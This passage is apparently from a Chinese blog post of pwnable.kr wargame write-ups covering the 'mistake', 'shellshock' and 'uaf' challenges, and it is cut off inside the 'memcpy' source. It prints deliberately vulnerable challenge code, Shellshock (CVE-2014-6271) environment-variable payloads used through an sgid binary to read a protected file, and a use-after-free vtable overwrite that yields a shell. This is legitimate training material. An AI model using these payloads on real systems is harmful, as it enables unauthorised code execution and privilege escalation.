class="line">        xor(pw_buf2, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Password OK\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Wrong Password\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看着代码长，其实就一个比较优先级的问题。</p><p>问题在第17行的if判断，原意是将open返回值赋给fd再和0比较，但由于‘&lt;’的优先级大于‘=’，所以实际上是先比较，再赋值。</p><p>若成功打开文件，fd为0，第27行的read就是从stdin读取数据存放到pw_buf。然后第38行将pw_buf2按位和1进行异或，实际上就是按位取反。最后pw_buf和pw_buf2比较，若相等，则拿到flag。</p><p>所以，让pw_buf=0000000000,pw_buf2=1111111111</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mistake@ubuntu:~$ ./mistake</span><br><span class="line">do not bruteforce...</span><br><span class="line">1111111111</span><br><span class="line">input password : 0000000000</span><br><span class="line">Password OK</span><br><span class="line">Mommy, the operator priority always confuses me :(</span><br></pre></td></tr></table></figure><p>拿到flag</p><h2 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h2><p>题目：<strong>ssh <a href="mailto:shellshock@pwnable.kr" target="_blank" rel="noopener">shellshock@pwnable.kr</a> -p2222 (pw:guest)</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">setresuid(getegid(), getegid(), getegid());</span><br><span class="line">setresgid(getegid(), getegid(), getegid());</span><br><span class="line">system(<span class="string">"/home/shellshock/bash -c 'echo shock_me'"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题来源于漏洞<strong>CVE-2014-6271</strong>(破壳漏洞)</p><p>所以首先学习一下这个漏洞。</p><h3 id="CVE-2014-6271"><a href="#CVE-2014-6271" class="headerlink" title="CVE-2014-6271"></a>CVE-2014-6271</h3><p>关于bash的环境变量。</p><p>首先看看普通环境变量是怎么定义的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">shellshock@ubuntu:~$ test=&quot;abcd&quot;  #这样定义的环境变量只能用于当前shell</span><br><span class="line"></span><br><span class="line">shellshock@ubuntu:~$ export test2=&quot;abcd&quot; #使用export定义的环境变量可以在当前shell及其子shell中使用</span><br><span class="line">shellshock@ubuntu:~$ bash #进入子shell</span><br><span class="line">shellshock@ubuntu:~$ echo $test2 #打印刚才设置环境变量</span><br><span class="line">abcd #可以输出</span><br><span class="line">shellshock@ubuntu:~$ echo $test #未加export的环境变量</span><br><span class="line"> #没有输出</span><br><span class="line">shellshock@ubuntu:~$</span><br></pre></td></tr></table></figure><p>然后看下bash的函数如何定义。</p><p>bash的函数定义方法和c很像：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shellshock@ubuntu:~$ x()&#123; echo &quot;test&quot;;&#125;</span><br><span class="line">shellshock@ubuntu:~$ x</span><br><span class="line">test</span><br><span class="line">shellshock@ubuntu:~$</span><br></pre></td></tr></table></figure><p>所以同样也可以将函数定义为环境变量。</p><p>将函数定义为环境变量：(和普通环境变量一样，也是使用键值对的方式定义，等号左边是键，单引号内是值)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellshock@ubuntu:~$ export x=&apos;() &#123; echo a test;&#125;;&apos; #若不加export，此环境变量就不会在子shell生效</span><br><span class="line">shellshock@ubuntu:~$ env #这时用env查看环境变量就可以看到刚刚设置的环境变量变成了键值对形式</span><br><span class="line">x=() &#123; echo a test;&#125;;</span><br></pre></td></tr></table></figure><p>也就是说，当环境变量的Value开头为’(){‘时，bash就认为这是一个函数，调用这个环境变量就相当于执行这个函数体的代码。</p><p>而<strong>CVE-2014-6271</strong>的漏洞就在于可以在函数体后面继续添加代码，并被执行。如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellshock@ubuntu:~$ export x=&apos;() &#123; echo abc;&#125;;echo vuln!!;&apos; #在函数体后添加代码</span><br><span class="line">shellshock@ubuntu:~$ ./bash -c &quot;echo a test&quot; #调用有漏洞的shell</span><br><span class="line">vuln!!</span><br><span class="line">a test</span><br><span class="line">shellshock@ubuntu:~$</span><br></pre></td></tr></table></figure><p>可以看出，<strong>这个漏洞就是在调用shell并读取环境变量时，在读取到设置的函数时由于对函数边界的判断不严谨导致自动执行后面的语句</strong>。</p><p>参考：</p><p><a href="https://bbs.ichunqiu.com/thread-8046-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-8046-1-1.html</a></p><p><a href="https://blog.csdn.net/tinyletero/article/details/40261593" target="_blank" rel="noopener">https://blog.csdn.net/tinyletero/article/details/40261593</a></p><h3 id="文件的特殊权限"><a href="#文件的特殊权限" class="headerlink" title="文件的特殊权限"></a>文件的特殊权限</h3><p>知道了这些可以尝试一下解题了</p><p>很自然的构造出一个环境变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellshock@ubuntu:~$ export x=&apos;() &#123; bash -c &quot;cat flag&quot;;&#125;;x;&apos;</span><br><span class="line">shellshock@ubuntu:~$ ./bash -c &quot;echo test&quot;</span><br><span class="line">cat: flag: Permission denied</span><br><span class="line">Segmentation fault</span><br><span class="line">shellshock@ubuntu:~$</span><br></pre></td></tr></table></figure><p>整个payload如下<br><img src="https://i.imgur.com/zVrRiZR.png" alt=""></p><p>结果没权限读取flag文件</p><p>那就看一眼我们都有那些权限<br><img src="https://i.imgur.com/A7GoVcp.png" alt=""></p><p>注意到可执行文件./shellshock的gid具有s特权，也就是sgid权限。<strong>意味着执行者在执行过程中会获得该程序的用户组权限</strong>。所以当我以shellshock身份执行这个文件时，在执行过程中相当于我加入了shellshock_pwn用户组，所以shellshock调用的bash就具有了shellshock_pwn权限，而读取flag需要的权限就是shellshock_pwn，从而读到flag。</p><p>参考：<a href="http://www.cnblogs.com/snake-hand/p/3161511.html" target="_blank" rel="noopener">http://www.cnblogs.com/snake-hand/p/3161511.html</a></p><p>所以把刚才的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bash -c &quot;echo test&quot;</span><br></pre></td></tr></table></figure><p>换成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./shellshock</span><br></pre></td></tr></table></figure><p>就行了</p><p>最后拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellshock@ubuntu:~$ ./shellshock</span><br><span class="line">only if I knew CVE-2014-6271 ten years ago..!!</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure><p>还有一种设置环境变量的方法也可以拿到flag，本质都差不多。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env x=&apos;() &#123; bash -c &quot;cat flag&quot;;&#125;;x;&apos; ./shellshock</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/JWCBX1L.png" alt=""><br>env的作用：<strong>run a program in a modified environment</strong></p><p>区别在于第二个解法的环境变量是一次性的。</p><h2 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h2><p>题目：<strong>ssh <a href="mailto:uaf@pwnable.kr" target="_blank" rel="noopener">uaf@pwnable.kr</a> -p2222 (pw:guest)</strong></p><p>之前做protostar有一关uaf的题目逃课了，现在终于跑不了了(￣ε(#￣)☆</p><h3 id="什么是uaf"><a href="#什么是uaf" class="headerlink" title="什么是uaf"></a>什么是uaf</h3><p><strong>Use After Free</strong>，顾名思义：使用释放后的内存空间</p><p>我们知道，当访问一块已经被free过的内存时会让程序崩溃，像什么segmentation fault等等。uaf就是利用这一点，当我们重新申请一块和刚才一样大小的内存时，系统会把刚才那块内存分配给我们，但是由于系统并没有将指向之前被free的内存的指针置null，而新分配给我们的内存里的数据又是我们完全可控的，再利用刚才未被置null的指针，就可以劫持函数流，执行我们想执行的函数了。</p><p>所以，一块能触发uaf的内存至少应该满足：</p><ul><li>大小可控</li><li>数据可控</li></ul><h3 id="虚函数和虚表"><a href="#虚函数和虚表" class="headerlink" title="虚函数和虚表"></a>虚函数和虚表</h3><p>在面向对象程序设计中，派生类继承自基类。若基类函数前有关键字virtual，则该函数为虚函数，在其派生类中若有同名函数，则在调用派生类对象的该函数时，调用派生类函数，不会调用基类的同名函数。反之，当对象是基类对象时，就调用基类函数。(c++多态的实现)</p><p>具体的实现方法就要用到虚表了。</p><p>每一个存在虚函数的类中都有一个虚表(<strong>vtable</strong>)，虚表中依次存放了指向各个虚函数的指针。类的对象有一个指向虚表表头的指针(<strong>vptr</strong>)，该指针处于对象内存布局的最开始，往后才是对象的各个数据成员。</p><p><img src="https://i.imgur.com/COCPfr0.png" alt=""></p><p>在派生类中出现同名虚函数时，其虚表中指向同名函数的指针就会转而指向派生类的虚函数而非基类的，就像刚才说的一样。</p><p>派生类的虚表中除自己的虚函数指针外也包含其基类的虚函数指针(同名虚函数除外)，包括基类中的<strong>私有</strong>虚成员函数。</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">                system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">        <span class="keyword">int</span> age;</span><br><span class="line">        <span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"My name is "</span> &lt;&lt; name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am "</span> &lt;&lt; age &lt;&lt; <span class="string">" years old"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        Man(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am a nice guy!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        Woman(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am a cute girl!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        Human* m = <span class="keyword">new</span> Man(<span class="string">"Jack"</span>, <span class="number">25</span>);</span><br><span class="line">        Human* w = <span class="keyword">new</span> Woman(<span class="string">"Jill"</span>, <span class="number">21</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">size_t</span> len;</span><br><span class="line">        <span class="keyword">char</span>* data;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> op;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"1. use\n2. after\n3. free\n"</span>;</span><br><span class="line">                <span class="built_in">cin</span> &gt;&gt; op;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">switch</span>(op)&#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                                m-&gt;introduce();</span><br><span class="line">                                w-&gt;introduce();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                                len = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">                                data = <span class="keyword">new</span> <span class="keyword">char</span>[len];</span><br><span class="line">                                read(open(argv[<span class="number">2</span>], O_RDONLY), data, len);</span><br><span class="line">                                <span class="built_in">cout</span> &lt;&lt; <span class="string">"your data is allocated"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                                <span class="keyword">delete</span> m;</span><br><span class="line">                                <span class="keyword">delete</span> w;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析：</p><p>1、一共有三个类，Human，Man和Woman，并且Man，Woman继承自Human。</p><p>2、Human中有两个虚函数，<code>give_shell</code>(私有)和<code>introduce</code>(公有)。并且其派生类重写了<code>introduce</code>函数。</p><p>3、主函数分别实例化Man和Woman类为对象。case1调用两个派生类的introduce函数；case2申请一段大小为argv[1]内存，并从名为argv[2]的文件内取长度为argv[1]的数据填充；case3释放开头实例化的对象的空间。</p><p>思路：利用uaf劫持函数流使进程执行<code>give_shell</code>函数</p><ul><li>找到Man类的对象的大小，并将其作为argv[1]。</li><li>找到<code>give_shell</code>的地址</li><li>找到Man类的vtable和vptr，并覆写其vtable中指向<code>introduce</code>的指针为指向<code>give_shell</code>的指针。</li></ul><p>要看一个对象的大小，就看其类中的数据成员。因为是64位的程序，所以Man类中的int，string各占8字节，因为有虚函数，所以再加上vptr的大小，也是8字节，一共24字节。所以argv[1]=24.</p><p><img src="https://i.imgur.com/Ig6BY4R.png" alt=""><br>在new一个对象之前传的参数为0x18 = 24，所以刚才的推断没错。</p><p><img src="https://i.imgur.com/QlyLnLF.png" alt=""><br>搜一下vtable，找到了Man的vtable，第一个指针p1(<strong>0x401570</strong>)指向了<code>give_shell</code>，第二个p2(<strong>0x401578</strong>)指向了<code>introduce</code>。</p><p><img src="https://i.imgur.com/Yu3h1Vj.png" alt=""><br>从图中可以推断出v12和v13分别是m和w的vptr。在case1中调用<code>introduce</code>时，本来指针指向的是<code>give_shell</code>，将vptr的值+8，就变成指向<code>introduce</code>了。</p><p>当我们执行case3申请一个24字节大小的空间时，系统就会将刚才free掉的空间分配给我们。又因为指向m和w的指针依旧存在，所以只要我们构造新申请的内存内的数据为p1-8，再执行case1时，程序就会以为我们构造的地址指向<code>give_shell</code>，加上8，就指向了<code>introduce</code>，但其实+8之后是指向<code>give_shell</code>。最终执行<code>give_shell</code>，达到目的。</p><p>所以，<strong>p1 - 8 = 0x401570 - 8 = 0x401568</strong></p><p>由于case3先后释放了m和w的内存，如果只执行一次case2只会得到w的那块内存，所以要执行两次case2。</p><p><img src="https://i.imgur.com/xzvCpuH.png" alt=""></p><h2 id="memcpy"><a href="#memcpy" class="headerlink" title="memcpy"></a>memcpy</h2><p>题目：<strong>ssh <a href="mailto:memcpy@pwnable.kr" target="_blank" rel="noopener">memcpy@pwnable.kr</a> -p2222 (pw:guest)</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// compiled with : gcc -o memcpy memcpy.c -m32 -lm</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">rdtsc</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">asm</span>(<span class="string">"rdtsc"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">slow_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">                dest[i] = src[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">fast_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">        <span class="keyword">size_t</span> i;</span><br><span class="line">        <span class="comment">// 64-byte block fast copy</span></span><br><span class="line">        <span class="keyword">if</span>(len &gt;= <span class="number">64</span>)&#123;</span><br><span class="line">                i = len / <span class="number">64</span>;</span><br><span class="line">                len &amp;= (<span class="number">64</span><span class="number">-1</span>);</span><br><span class="line">                <span class="keyword">while</span>(i-- &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                        __asm__ __volatile__ (</span><br><span class="line">                        <span class="string">"movdqa (%0), %%xmm0\n"</span></span><br><span class="line">                        <span class="string">"movdqa 16(%0), %%xmm1\n"</span></span><br><span class="line">                        <span class="string">"movdqa 32(%0), %%xmm2\n"</span></span><br><span class="line">                        <span class="string">"movdqa 48(%0), %%xmm3\n"</span></span><br><span class="line">                        <span class="string">"movntps %%xmm0, (%1)\n"</span></span><br><span class="line">                        <span class="string">"movntps %%xmm1, 16(%1)\n"</span></span><br><span class="line">                        <span class="string">"movntps %%xmm2, 32(%1)\n"</span></span><br><span class="line">                        <span class="string">"movntps %%xmm3, 48(%1)\n"</span></span><br><span class="line">                        ::<span class="string">"r"</span>(src),<span class="string">"r"</span>(dest):<span class="string">"memory"</span>);</span><br><span class="line">                        dest += <span class="number">64</span>;</span><br><span class="line">                        src += <span class="number">64</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// byte-to-byte slow copy</span></span><br><span class="line">        <span class="keyword">if</span>(len) slow_memcpy(dest, src, len);</span><br><span class="line">        <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Hey, I have a boring assignment for CS class.. :(\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"The assignment is simple.\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"-----------------------------------------------------\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"- What is the best implementation of memcpy?        -\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"- 1. implement your own slow/fast version of memcpy -\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"- 2. compare them with various size of data         -\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"- 3. conclude your experiment and submit report     -\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"-----------------------------------------------------\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"This time, just help me out with my experiment and get flag\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"No fancy hacking, I promise :D\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> t1, t2;</span><br><span class="line">        <span class="keyword">int</span> e;</span><br><span class="line">        <span class="keyword">char</span>* src;</span><br><span class="line">        <span class="keyword">char</span>* dest;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> low, high;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line">        <span class="comment">// allocate memory</span></span><br><span class="line">        <span class="keyword">char</span>* cache1 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">char</span>* cache2 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        src = mmap(<span class="number">0</span>, <span class="number">0x2000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span 